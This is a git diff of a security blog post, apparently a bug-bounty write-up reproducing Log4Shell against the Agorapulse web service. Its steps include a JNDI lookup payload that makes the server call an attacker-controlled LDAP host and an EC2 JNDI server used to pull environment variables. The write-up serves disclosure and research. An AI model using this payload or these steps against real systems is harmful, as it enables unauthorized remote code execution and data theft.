@@ -45,25 +45,28 @@ So the steps to reproduce were as follows
 - Start Burp and create a new burp collaborator Client
 - Now Login to agorapulse and click on `Publish` to publish a new post.
 
-1.png
+![1.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/1.png)
 
 - Now use your burp collaborator to make a new payload `${jndi:ldap://<Your-Burp-Collab-URL>/a}`, and paste it in the Post Section.
 - Now Select any profile from the left side and Publish the POST
 
-2.png
+![2.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/2.png)
 
 - On going back to burp collaborator Client you will see a Pingback on it
-3.png
 
-- 
+![3.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/3.png)
+
+
   
 ## Demonstration of Impact ( Remote Code Execution )
 
 
-As mentioned in earlier sections the successful exploitation could lead to RCE. We refrained from doing any such action which could lead to any kind of disruption in services to the vulnerable services. So, we decide to prove the impact by extacting the global PATH variable to prove the real impact of the vulnerability and we needed to setup and JNDI server for that, So we quickly setup an amazon ec2 and setup an JNDI server using the following approach.
+As mentioned in earlier sections the successful exploitation could lead to RCE. We refrained from doing any such action which could lead to any kind of disruption in services. So, we decide to prove the impact by extacting the global PATH variable to prove the real impact of the vulnerability and we needed to setup and JNDI server for that, So we quickly setup an amazon ec2 and setup an JNDI server using the following approach.
 
 - SSH to your Server
-``
+
+
+```
 ssh user@<your-ip>
 ```
 
@@ -87,7 +90,7 @@ As we went back to Agorapulse and make a another post with this Payload : `${jnd
 we were able just able to extract the environment variables of the server.
 
 
-4.png
+![4.png](https://github.com/Snap-sec/blog/blob/gh-pages/assets/images/agora-log4j/4.png)
   
 
 We stopped right after extracting the path variables of the vulnerable server just to keep the exploitation ethical.
